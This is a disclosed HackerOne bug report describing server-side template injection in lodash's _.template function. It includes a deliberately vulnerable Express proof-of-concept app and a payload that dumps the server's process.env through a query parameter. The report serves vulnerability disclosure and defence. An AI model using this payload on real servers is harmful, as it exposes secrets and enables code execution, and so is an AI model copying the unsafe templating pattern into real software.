# Server-side Template Injection in lodash.js 

## Report Details
- **Report ID**: 904672
- **URL**: https://hackerone.com/reports/904672
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-06-22T06:16:28.733Z
- **Disclosed**: 2021-06-28T08:43:38.785Z

## Reporter
- **Username**: zerohex
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report Server-side Template Injection in lodash.js  (_.template function)
It allows the execution of code on the server

# Module

**module name:** lodash
**version:** 4.17.15
**npm page:** `https://www.npmjs.com/package/lodash`

## Module Description

The Lodash library exported as Node.js modules.

## Module Stats

26,664,631 weekly downloads

# Vulnerability

## Vulnerability Description

The _.template function of the lodash package does not properly validate user-supplied input. 



An application making use of the lodash package may be exploited by an attacker that controls the value of a parameter processed by the _.template function. An attacker can inject code such as Javascript within parenthesis for example `parameter=${JSON.stringify(process.env)}` which will be executed by the server.

## Steps To Reproduce:

**Step 1:** Create a test application that requires the lodash.js library. The application below accepts user-supplied input in the  'name' parameter that is handled by lodash `_.template` function

```
const express = require('express');
const _ = require('lodash');
const escapeHTML = require('escape-html');
const app = express();
app.get('/', (req, res) => {
  res.set('Content-Type', 'text/html');
  const name = req.query.name
  // Create a template from user input
  const compiled = _.template("Hello " + escapeHTML(name) + ".");
  res.status(200).send(compiled());
});

app.listen(8000, () => {
  console.log('POC app listening on port 8000!')
});
```

**Step 2:** Visit the vulnerable application at http://127.0.0.1:8000/?name=Test

**Step 3:** Visit the vulnerable application and enter a payload such as `${JSON.stringify(process.env)}` into the `name` parameter e.g.  http://127.0.0.1:8000/?name=Test${JSON.stringify(process.env)}

## Supporting Material/References:

- OSX 10.15.5
- NODEJS v10.16.0
- NPM v 6.9.0

# Wrap up

- I contacted the maintainer to let them know: [Y/N] N
- I opened an issue in the related repository: [Y/N] N

> Hunter's comments and funny memes goes here

Apologies if I haven't used the ideal terminology or if this is a duplicate.

## Impact

Remote code execution

## Attachments
No attachments
